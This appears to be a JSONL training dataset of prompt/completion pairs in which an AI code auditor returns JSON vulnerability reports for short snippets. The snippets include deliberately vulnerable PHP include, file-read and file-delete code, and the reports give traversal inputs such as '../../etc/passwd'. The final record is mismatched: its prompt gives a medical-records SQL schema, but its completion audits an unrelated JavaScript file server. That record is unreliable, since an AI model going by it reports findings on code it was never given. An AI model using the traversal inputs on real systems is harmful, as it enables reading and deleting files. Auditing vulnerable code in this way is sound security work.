{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"INTERFACE_DEFINITION\",\n  \"component_name\": \"ResetPasswordRequest\",\n  \"component_code\": \"interface ResetPasswordRequest {\\n  email: string;\\n  token: string;\\n  newPassword: string;\\n}\",\n  \"component_description\": \"TypeScript interface representing a reset password request payload.\"\n}", "completion": "{\n  \"component_type\": \"INTERFACE_DEFINITION\",\n  \"component_name\": \"ResetPasswordRequest\",\n  \"component_code\": \"interface ResetPasswordRequest {\\n  email: string;\\n  token: string;\\n  newPassword: string;\\n}\",\n  \"component_description\": \"TypeScript interface representing a reset password request payload.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"InsecureInclude\",\n  \"component_code\": \"<?php\\n$page = $_GET['page'];\\ninclude($page);\",\n  \"component_description\": \"PHP script including files dynamically based on user input.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"InsecureInclude\",\n  \"component_code\": \"<?php\\n$page = $_GET['page'];\\ninclude($page);\",\n  \"component_description\": \"PHP script including files dynamically based on user input.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"File Inclusion\",\n      \"cve_score\": 9.1,\n      \"exploitation_methods\": [\n        \"Include remote files via URL if remote inclusion enabled.\",\n        \"Include local files like /etc/passwd causing information disclosure.\"\n      ],\n      \"developer_fixes\": [\n        \"Avoid dynamic includes; use whitelisted filenames.\",\n        \"Disable allow_url_include in PHP configuration.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"open_user_file\",\n  \"component_code\": \"def open_user_file(path):\\n    f = open(path, 'r')\\n    return f.read()\",\n  \"component_description\": \"Python function opening arbitrary file paths without sanitization.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"open_user_file\",\n  \"component_code\": \"def open_user_file(path):\\n    f = open(path, 'r')\\n    return f.read()\",\n  \"component_description\": \"Python function opening arbitrary file paths without sanitization.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Path Traversal\",\n      \"cve_score\": 8.8,\n      \"exploitation_methods\": [\n        \"Use ../../ to access protected files.\",\n        \"Read sensitive server configurations or credentials.\"\n      ],\n      \"developer_fixes\": [\n        \"Restrict access to safe directories only.\",\n        \"Sanitize and validate input file paths.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"LibrarySystem\",\n  \"component_code\": \"class Book:\\n    def __init__(self, title, author):\\n        self.title = title\\n        self.author = author\\n\\nclass LibrarySystem:\\n    def __init__(self):\\n        self.books = []\\n\\n    def add_book(self, title, author):\\n        new_book = Book(title, author)\\n        self.books.append(new_book)\\n\\n    def list_books(self):\\n        for book in self.books:\\n            print(f\\\"{book.title} by {book.author}\\\")\",\n  \"component_description\": \"Python classes to manage a basic library system with book addition and listing functionality.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"LibrarySystem\",\n  \"component_code\": \"class Book:\\n    def __init__(self, title, author):\\n        self.title = title\\n        self.author = author\\n\\nclass LibrarySystem:\\n    def __init__(self):\\n        self.books = []\\n\\n    def add_book(self, title, author):\\n        new_book = Book(title, author)\\n        self.books.append(new_book)\\n\\n    def list_books(self):\\n        for book in self.books:\\n            print(f\\\"{book.title} by {book.author}\\\")\",\n  \"component_description\": \"Python classes to manage a basic library system with book addition and listing functionality.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"delete_file\",\n  \"component_code\": \"import os\\n\\ndef delete_file(filepath):\\n    os.remove(filepath)\",\n  \"component_description\": \"Python function deleting a file without validating the file path.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"delete_file\",\n  \"component_code\": \"import os\\n\\ndef delete_file(filepath):\\n    os.remove(filepath)\",\n  \"component_description\": \"Python function deleting a file without validating the file path.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Arbitrary File Deletion\",\n      \"cve_score\": 8.7,\n      \"exploitation_methods\": [\n        \"Input '../../important.txt' to delete critical files.\",\n        \"Delete configuration or system files by providing crafted paths.\"\n      ],\n      \"developer_fixes\": [\n        \"Validate and restrict file paths before deletion.\",\n        \"Restrict operations to a safe directory only.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"InvoiceManager\",\n  \"component_code\": \"public class InvoiceManager {\\n  public void generateInvoice(String customerName, double amount) {\\n    System.out.println(\\\"Invoice generated for: \\\" + customerName + \\\" Amount: $\\\" + amount);\\n  }\\n}\",\n  \"component_description\": \"Java class generating simple invoices.\"\n}", "completion": "{\n  \"component_type\": \"CLASS_DEFINITION\",\n  \"component_name\": \"InvoiceManager\",\n  \"component_code\": \"public class InvoiceManager {\\n  public void generateInvoice(String customerName, double amount) {\\n    System.out.println(\\\"Invoice generated for: \\\" + customerName + \\\" Amount: $\\\" + amount);\\n  }\\n}\",\n  \"component_description\": \"Java class generating simple invoices.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"PROCEDURE_DEFINITION\",\n  \"component_name\": \"insertUserReview\",\n  \"component_code\": \"CREATE PROCEDURE insertUserReview(IN userId INT, IN review TEXT)\\nBEGIN\\n  INSERT INTO reviews(user_id, review_text, created_at) VALUES (userId, review, NOW());\\nEND;\",\n  \"component_description\": \"SQL procedure inserting user reviews into a database.\"\n}", "completion": "{\n  \"component_type\": \"PROCEDURE_DEFINITION\",\n  \"component_name\": \"insertUserReview\",\n  \"component_code\": \"CREATE PROCEDURE insertUserReview(IN userId INT, IN review TEXT)\\nBEGIN\\n  INSERT INTO reviews(user_id, review_text, created_at) VALUES (userId, review, NOW());\\nEND;\",\n  \"component_description\": \"SQL procedure inserting user reviews into a database.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"read_file\",\n  \"component_code\": \"def read_file(filename):\\n    with open('/var/data/' + filename, 'r') as f:\\n        return f.read()\",\n  \"component_description\": \"Python function reading a file from a predefined directory.\"\n}", "completion": "{\n  \"component_type\": \"FUNCTION_DEFINITION\",\n  \"component_name\": \"read_file\",\n  \"component_code\": \"def read_file(filename):\\n    with open('/var/data/' + filename, 'r') as f:\\n        return f.read()\",\n  \"component_description\": \"Python function reading a file from a predefined directory.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Path Traversal\",\n      \"cve_score\": 8.5,\n      \"exploitation_methods\": [\n        \"Use '../../etc/passwd' to read sensitive system files.\",\n        \"Access logs, SSH keys, or hidden configuration files.\"\n      ],\n      \"developer_fixes\": [\n        \"Restrict allowed filenames using a whitelist.\",\n        \"Validate and sanitize input before accessing files.\"\n      ]\n    }\n  ]\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"FileMetadata\",\n  \"component_code\": \"struct FileMetadata {\\n  std::string filename;\\n  int size;\\n  std::string uploadTime;\\n};\",\n  \"component_description\": \"C++ struct representing metadata of uploaded files.\"\n}", "completion": "{\n  \"component_type\": \"STRUCT_DEFINITION\",\n  \"component_name\": \"FileMetadata\",\n  \"component_code\": \"struct FileMetadata {\\n  std::string filename;\\n  int size;\\n  std::string uploadTime;\\n};\",\n  \"component_description\": \"C++ struct representing metadata of uploaded files.\",\n  \"vulnerabilities\": []\n}"}
{"prompt": "You are a highly skilled AI Security Code Auditor designed to deeply analyze source code components.\n\nYou must:\n1. Identify any security vulnerabilities in each code component.\n2. For each vulnerability found, provide:\n    - The exact vulnerability type (e.g., \"Insecure Deserialization\", \"Broken Authentication\").\n    - A CVE-like severity score on a scale of 0.0 to 10.0.\n    - 3-4 realistic, step-by-step exploitation methods, showing how an attacker can practically exploit this vulnerability.\n      (Each method must be described clearly, including prerequisites and the sequence of actions.)\n    - Specific, actionable developer fixes to eliminate or mitigate the vulnerability.\n      (Avoid vague advice like \"use better security\"; be exact.)\n\nAdditional Requirements:\n- If no vulnerabilities are found, return an empty list for vulnerabilities.\n- Maintain a consistent output format in strict JSON:\n\n  {\n      \"component_type\": \"<COMPONENT_TYPE>\",\n      \"component_name\": \"<COMPONENT_NAME>\",\n      \"component_code\": \"<COMPONENT_CODE>\",\n      \"component_description\": \"<COMPONENT_DESCRIPTION>\",\n      \"vulnerabilities\": [\n          {\n              \"vul_type\": \"<VULNERABILITY_TYPE>\",\n              \"cve_score\": <FLOAT_SCORE>,\n              \"exploitation_methods\": [\n                  \"<Step-by-step exploitation method 1>\",\n                  \"<Step-by-step exploitation method 2>\",\n                  \"<Step-by-step exploitation method 3>\",\n                  \"<Optional: Step-by-step exploitation method 4>\"\n              ],\n              \"developer_fixes\": [\n                  \"<Specific fix 1>\",\n                  \"<Specific fix 2>\",\n                  \"<Optional: fix 3>\"\n              ]\n          }\n      ]\n  }\n\nRules:\n- Be highly realistic. Only suggest exploitation methods that are practical in real-world attack scenarios.\n- Be very strict in vulnerability identification \u2014 do not miss major vulnerabilities.\n- Be concise but complete. No unnecessary repetition.\n- Do not hallucinate vulnerabilities if the code is safe.\n- Output only the structured JSON. No explanations outside JSON.\n\nImportant:\n- You must think like a real security researcher.\n- If a component includes multiple vulnerabilities, list each separately under the \"vulnerabilities\" field.\n\nOutput must be deterministic, clean, and immediately parsable by downstream systems.\n\nInput component data is as follows:\n{\n  \"component_type\": \"SCHEMA_DEFINITION\",\n  \"component_name\": \"MedicalRecordsSystem\",\n  \"component_code\": \"CREATE TABLE Patients (\\n    id INT PRIMARY KEY,\\n    name VARCHAR(100) NOT NULL,\\n    date_of_birth DATE NOT NULL,\\n    gender VARCHAR(10),\\n    contact_info TEXT\\n);\\n\\nCREATE TABLE Appointments (\\n    id INT PRIMARY KEY,\\n    patient_id INT,\\n    doctor_id INT,\\n    appointment_date DATETIME,\\n    reason TEXT,\\n    FOREIGN KEY (patient_id) REFERENCES Patients(id),\\n    FOREIGN KEY (doctor_id) REFERENCES Doctors(id)\\n);\\n\\nCREATE TABLE Doctors (\\n    id INT PRIMARY KEY,\\n    name VARCHAR(100) NOT NULL,\\n    specialty VARCHAR(100),\\n    email VARCHAR(255) UNIQUE\\n);\\n\\nCREATE TABLE Prescriptions (\\n    id INT PRIMARY KEY,\\n    appointment_id INT,\\n    medication TEXT,\\n    dosage TEXT,\\n    instructions TEXT,\\n    FOREIGN KEY (appointment_id) REFERENCES Appointments(id)\\n);\",\n  \"component_description\": \"SQL schema for a medical record management system with tables for patients, doctors, appointments, and prescriptions.\"\n}", "completion": "{\n  \"component_type\": \"GLOBAL_CODE\",\n  \"component_name\": \"DocumentEditor\",\n  \"component_code\": \"const express = require('express');\\nconst fs = require('fs');\\nconst bodyParser = require('body-parser');\\nconst app = express();\\n\\napp.use(bodyParser.json());\\n\\napp.post('/save', (req, res) => {\\n    const filename = req.body.filename;\\n    const content = req.body.content;\\n    fs.writeFileSync(`documents/${filename}`, content);\\n    res.send('File saved');\\n});\\n\\napp.get('/load', (req, res) => {\\n    const filename = req.query.filename;\\n    const data = fs.readFileSync(`documents/${filename}`, 'utf8');\\n    res.send(data);\\n});\\n\\napp.listen(3000, () => {\\n    console.log('Document editor server running on port 3000');\\n});\",\n  \"component_description\": \"JavaScript-based document editor backend allowing users to save and load file content from a folder.\",\n  \"vulnerabilities\": [\n    {\n      \"vul_type\": \"Path Traversal\",\n      \"cve_score\": 8.7,\n      \"exploitation_methods\": [\n        \"Send ../../../etc/passwd as filename to access sensitive files\",\n        \"Overwrite arbitrary files outside intended folder\",\n        \"Leak internal code or configuration data\"\n      ],\n      \"developer_fixes\": [\n        \"Sanitize file paths using a strict whitelist or base directory resolver\",\n        \"Reject filenames containing ../ or similar patterns\"\n      ]\n    },\n    {\n      \"vul_type\": \"Improper Input Validation\",\n      \"cve_score\": 6.6,\n      \"exploitation_methods\": [\n        \"Send malformed JSON or large payloads to crash the 